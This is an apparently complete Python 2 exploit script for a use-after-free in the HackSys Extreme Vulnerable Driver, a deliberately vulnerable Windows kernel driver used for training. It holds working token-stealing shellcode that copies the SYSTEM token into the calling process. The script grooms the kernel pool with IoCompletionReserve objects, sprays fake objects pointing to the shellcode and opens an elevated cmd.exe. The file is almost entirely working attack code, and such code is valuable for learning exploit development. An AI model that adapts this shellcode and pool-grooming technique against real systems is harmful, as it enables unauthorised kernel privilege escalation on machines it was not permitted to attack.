import ctypes, os, struct, sys, win32con
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32

def heap_alloc_payload():
	token_stealing_shellcode = (
		#---[Setup]
		"\x60"                      # pushad
		"\x64\xA1\x24\x01\x00\x00" 	# mov eax, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
		"\x89\xC1"                  # mov ecx, eax (Current _EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" 	# mov ebx, [eax + TOKEN_OFFSET]
		#---[Copy System PID token]
		"\xBA\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
		"\x39\x90\xB4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
		"\x75\xED"                  # jnz                           ->|
		"\x8B\x90\xF8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
		#---[Recover]
		"\x61"                      # popad
		"\xC3"              		# ret
	)
	
	payload_address = id(token_stealing_shellcode) + 20
	print "[+] Payload address: 0x%X" % payload_address
	return payload_address

	
ICR_object_array_1 = []
ICR_object_array_2 = []
	
def pool_feng_shui_with_ICR():
	global ICR_object_array_1
	global ICR_object_array_2
	print "[+] Defragmenting heap"
	for x in range(10000):
		hHandle = HANDLE(0)
		ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, 0x1)
		ICR_object_array_1.append(hHandle)
	print "[+] Allocating IoCompletionReserve Objects"
	for y in range(5000):
		hHandle = HANDLE(0)
		ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, 0x1)
		ICR_object_array_2.append(hHandle)
	print "[+] Freeing selected IoCompletionReserve Objects"
	for x in range (0,5000,2):
		kernel32.CloseHandle(ICR_object_array_2[x])

				
def trigger_UAF():
	dwReturn      = c_ulong()
	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not driver_handle or driver_handle == -1:
		print "[!] Driver handle not found : Error " + str(ctypes.GetLastError())
		sys.exit()
		
		
	pool_feng_shui_with_ICR()
	
	print "[+] Allocating UAF Object"
	kernel32.DeviceIoControl(driver_handle, 0x222013, None, 0, None, 0,byref(dwReturn), None)
	print "[+] Freeing UAF Object"
	kernel32.DeviceIoControl(driver_handle, 0x22201B, None, 0, None, 0,byref(dwReturn), None)
	
	print "[+] Constructing fake object"
	shellcode_ptr = heap_alloc_payload()
	evil_input = struct.pack("<L",shellcode_ptr) + "A" * 0x53 + "\x00"
	evil_input_ptr = id(evil_input) + 20
	evil_size  = len(evil_input)
	
	fake_objects_number = 0x1000
	print "[+] Allocating 0x%X fake objects (size: 0x%X)" % (fake_objects_number, evil_size)
	for x in range(fake_objects_number):
		kernel32.DeviceIoControl(driver_handle, 0x22201F, evil_input_ptr, evil_size, None, 0,byref(dwReturn), None)
	
	print "[+] Triggering UAF .."
	kernel32.DeviceIoControl(driver_handle, 0x222017, None, 0, None, 0,byref(dwReturn), None)
	
	if shell.IsUserAnAdmin():
		print "[*] Enjoy Elevated Privs !\r\n"
		os.system('cmd.exe')
	else:
		print "[!] Exploit did not work. Re-run it!"
	
	
def preamble():
	print "\r\n"
	print "HackSys Extreme Vulnerable Driver : Use After Free"
	print "Author: @GradiusX"
	print "\r\n"		

	
if __name__ == '__main__':
	preamble()
	trigger_UAF()